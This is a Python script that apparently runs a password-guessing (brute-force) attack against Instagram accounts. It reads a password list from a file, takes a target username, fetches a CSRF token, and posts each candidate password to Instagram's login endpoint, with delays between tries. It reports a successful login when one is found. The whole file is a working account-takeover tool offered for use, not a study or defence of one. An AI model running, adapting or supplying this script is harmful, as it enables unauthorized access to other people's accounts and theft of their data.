import requests
import json
import time
import os

filename = 'pass.txt'
if os.path.isfile(filename):
	with open(filename) as f:
	    passwords = f.read().splitlines()
	    print ('%s Passwords loads successfully' % len(passwords))
else:
	print ('Please create passwords file (pass.txt)')
	exit()

sess = requests.Session()

UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'

username = str(input('Please enter a username: '))

delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 


#check if passwords file con passwords
if (len(passwords) < 1):
	print ('Please add password to the passwords file')
	exit()

#check if user exists
r = sess.get('https://www.instagram.com/%s/?__a=1' % username) 
if (r.status_code == 404):
	print ('User not found')
	exit()

#first time -> to get csrftoken
r = sess.get('https://www.instagram.com/') 
token = r.cookies.get_dict()['csrftoken']
print ('Get csrftoken %s' % token)
print (' ')

#build auth headers
headers = {
	'UserAgent':UserAgent,
	'x-instagram-ajax':'1',
	'x-csrftoken':token,
	'x-requested-with': 'XMLHttpRequest',
	'origin': 'https://www.instagram.com',
	'ContentType' : 'application/x-www-form-urlencoded',
	'KeepAlive': 'true',
	'Accept': '*/*',
	'Referer': 'https://www.instagram.com',
	'authority': 'www.instagram.com'
}

for i in range(len(passwords)):
	password = passwords[i]
	#build post data
	data = {'username':username, 'password':password}
	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers)
	#parse response
	data = json.loads(r.text)
	if (data['status'] == 'fail'):
		print (data['message'])
		exit()
	
	#check res json
	if (data['authenticated'] == True):
		print ('Login success %s' % [username,password])
	else:
		print ('Password incorrect [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		an = str(input('Type y/n to exit: '))
		if (an == 'y'):
			exit()
		else:
			continue
		

